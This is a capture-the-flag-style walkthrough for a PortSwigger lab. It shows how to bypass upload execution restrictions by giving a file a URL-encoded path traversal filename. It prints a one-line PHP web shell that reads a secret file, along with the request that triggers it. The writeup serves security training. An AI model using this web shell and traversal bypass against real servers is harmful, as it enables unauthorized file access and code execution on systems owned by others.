# Web shell upload via path traversal

**Lab Url**: [https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)

## Objective

This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a [secondary vulnerability](https://portswigger.net/web-security/file-path-traversal).

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

The server blocks execution of files in the upload directory, but the filename is not sanitised for path traversal. By URL-encoding the traversal sequence in the filename, we can write the shell outside the upload directory where execution is allowed.

### Step 1: Upload a PHP web shell with a path traversal filename

Name the file `%2e%2e%2fexploit.php` — this decodes to `../exploit.php` on the server, placing the file one directory above the uploads folder:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Set the `Content-Type` to a valid image MIME type to pass any type checks. The server writes the file to a parent directory where scripts can execute.

### Step 2: Retrieve the secret

Visit the uploaded shell at the path where it landed (typically the parent of `/files/avatars/`):

```http
GET /files/exploit.php
```

The PHP script executes and returns the contents of `/home/carlos/secret`. Submit this secret to solve the lab.